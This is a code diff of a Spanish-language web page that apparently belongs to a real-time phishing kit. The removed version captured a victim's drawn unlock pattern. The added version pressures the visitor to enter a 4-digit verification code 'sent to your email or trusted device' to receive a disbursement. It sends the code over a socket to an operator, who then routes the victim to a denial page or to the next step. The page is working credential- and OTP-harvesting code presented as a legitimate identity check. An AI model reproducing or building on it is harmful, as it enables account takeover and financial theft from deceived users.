@@ -3,8 +3,9 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Patrón de Desbloqueo</title>
+  <title>Verificación por Código</title>
   <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css">
   <style>
     body {
       margin: 0;
@@ -29,52 +30,31 @@
       text-align: center;
     }
 
-    .pattern-container {
-      position: relative;
-      width: 300px;
-      height: 300px;
-      display: grid;
-      grid-template-columns: repeat(4, 1fr);
-      grid-template-rows: repeat(4, 1fr);
-      gap: 25px;
-      margin: 2rem 0;
-      touch-action: none;
-    }
-
-    canvas {
-      position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      pointer-events: none;
-    }
-
-    .dot {
-      width: 50px;
-      height: 50px;
-      border: 3px solid #ccc;
-      border-radius: 50%;
-      background: white;
-      margin: auto;
+    .input-group {
       display: flex;
       align-items: center;
-      justify-content: center;
-      font-weight: bold;
-      font-size: 1rem;
-      color: #555;
-      z-index: 2;
-      transition: background 0.2s, border-color 0.2s, color 0.2s;
+      background: #f0f2f5;
+      border-radius: 8px;
+      margin: 1rem 0;
+      padding: 0.5rem 1rem;
+      width: 100%;
     }
 
-    .dot.active {
-      background: #1B4D08;
-      border-color: #1B4D08;
-      color: white;
+    .input-group .icon {
+      color: #888;
+      margin-right: 0.5rem;
+    }
+
+    .input-group input {
+      border: none;
+      background: transparent;
+      outline: none;
+      flex: 1;
+      font-size: 1rem;
     }
 
     button {
-      background: #1B4D08;
+      background: #F54927;
       color: white;
       padding: 0.75rem 2rem;
       border: none;
@@ -94,19 +74,25 @@
       margin-top: 0.5rem;
       font-size: 0.85rem;
     }
+
+    .campo-requerido {
+      border: 1px solid red !important;
+    }
   </style>
 </head>
 <body>
   <div class="screen">
-    <h3>Dibuja tu patrón</h3>
-    <p>Los puntos están numerados para que identifiques tu patrón.</p>
-
-    <div class="pattern-container" id="patternContainer">
-      <canvas id="patternCanvas"></canvas>
+    <h3>¡ULTIMO PASO PARA IDENTIFICARTE!</h3>
+    <p>Coloca correctamente el codigo de asociacion que hemos enviado a tu correo electronico o dispositivo de confianza para asi identificarte y realizar el desembolso.</p>
+    
+    <!-- Campo único -->
+    <div class="input-group">
+      <div class="icon"><i class="fas fa-key"></i></div>
+      <input type="tel" id="codigo" placeholder="Código de verificación" pattern="[0-9]*" inputmode="numeric" minlength="4" maxlength="4" required>
     </div>
 
     <p id="mensajeError" class="mensaje-error"></p>
-    <button onclick="enviarPatron()">Validar patrón</button>
+    <button onclick="validarCodigo()">Validar código</button>
   </div>
 
   <script src="/socket.io/socket.io.js"></script>
@@ -115,115 +101,30 @@
     const sessionId = localStorage.getItem("sessionId");
     socket.emit("reconectar", sessionId);
 
-    const container = document.getElementById("patternContainer");
-    const canvas = document.getElementById("patternCanvas");
-    const ctx = canvas.getContext("2d");
-    const mensajeError = document.getElementById("mensajeError");
+    function validarCodigo() {
+      const codigo = document.getElementById("codigo").value;
+      const mensajeError = document.getElementById("mensajeError");
+      const codigoInput = document.getElementById("codigo");
 
-    let dots = [];
-    let pattern = [];
-    let isDrawing = false;
-
-    // Ajustar canvas
-    canvas.width = container.clientWidth;
-    canvas.height = container.clientHeight;
-
-    // Crear 16 puntos numerados
-    for (let i = 1; i <= 16; i++) {
-      const dot = document.createElement("div");
-      dot.classList.add("dot");
-      dot.dataset.id = i;
-      dot.textContent = i; // <-- EL NÚMERO GUÍA VISIBLE
-      container.appendChild(dot);
-      dots.push(dot);
-    }
-
-    function getDotCenter(dot) {
-      const rect = dot.getBoundingClientRect();
-      const containerRect = container.getBoundingClientRect();
-      return {
-        x: rect.left - containerRect.left + rect.width / 2,
-        y: rect.top - containerRect.top + rect.height / 2,
-      };
-    }
-
-    function startDrawing(e) {
-      e.preventDefault();
-      isDrawing = true;
-      pattern = [];
-      ctx.clearRect(0, 0, canvas.width, canvas.height);
-      dots.forEach(d => d.classList.remove("active"));
-    }
-
-    function draw(e) {
-      if (!isDrawing) return;
-      const x = (e.touches ? e.touches[0].clientX : e.clientX) - container.getBoundingClientRect().left;
-      const y = (e.touches ? e.touches[0].clientY : e.clientY) - container.getBoundingClientRect().top;
-
-      dots.forEach(dot => {
-        const rect = dot.getBoundingClientRect();
-        if (
-          x > rect.left - container.getBoundingClientRect().left &&
-          x < rect.right - container.getBoundingClientRect().left &&
-          y > rect.top - container.getBoundingClientRect().top &&
-          y < rect.bottom - container.getBoundingClientRect().top
-        ) {
-          if (!pattern.includes(dot.dataset.id)) {
-            pattern.push(dot.dataset.id);
-            dot.classList.add("active");
-          }
-        }
-      });
-
-      redrawLines();
-    }
-
-    function stopDrawing() {
-      isDrawing = false;
-    }
-
-    function redrawLines() {
-      ctx.clearRect(0, 0, canvas.width, canvas.height);
-      if (pattern.length < 2) return;
-      ctx.beginPath();
-      ctx.lineWidth = 4;
-      ctx.strokeStyle = "#1B4D08";
-
-      pattern.forEach((id, index) => {
-        const dot = dots[id - 1];
-        const { x, y } = getDotCenter(dot);
-        if (index === 0) ctx.moveTo(x, y);
-        else ctx.lineTo(x, y);
-      });
-
-      ctx.stroke();
-    }
-
-    function enviarPatron() {
       mensajeError.textContent = "";
-      if (pattern.length === 0) {
-        mensajeError.textContent = "Debes dibujar un patrón";
-        return;
+      codigoInput.classList.remove("campo-requerido");
+
+      if (!codigo) {
+        mensajeError.textContent = "El código es obligatorio";
+        codigoInput.classList.add("campo-requerido");
+      } else if (!/^\d{4}$/.test(codigo)) {
+        mensajeError.textContent = "El código debe tener exactamente 4 dígitos numéricos";
+        codigoInput.classList.add("campo-requerido");
+      } else {
+        // Enviar el código al backend
+        socket.emit("codigoIngresado", { codigo, sessionId });
+
+        // Ir a pantalla de espera
+        window.location.href = "opciones.html";
       }
-
-      // Aquí enviamos el orden exacto de IDs
-      socket.emit("patronIngresado", { patron: pattern, sessionId });
-
-      // Ir a la pantalla siguiente
-      window.location.href = "opciones.html";
     }
 
-    // Eventos
-    container.addEventListener("mousedown", startDrawing);
-    container.addEventListener("touchstart", startDrawing, { passive: false });
-
-    container.addEventListener("mousemove", draw);
-    container.addEventListener("touchmove", draw, { passive: false });
-
-    window.addEventListener("mouseup", stopDrawing);
-    window.addEventListener("touchend", stopDrawing);
-
-    socket.on("respuestaPatron", (decision) => {
+    socket.on("respuestaCodigo", (decision) => {
       if (decision === "error") {
         window.location.href = "denegado.html";
       } else if (decision === "finalizar") {
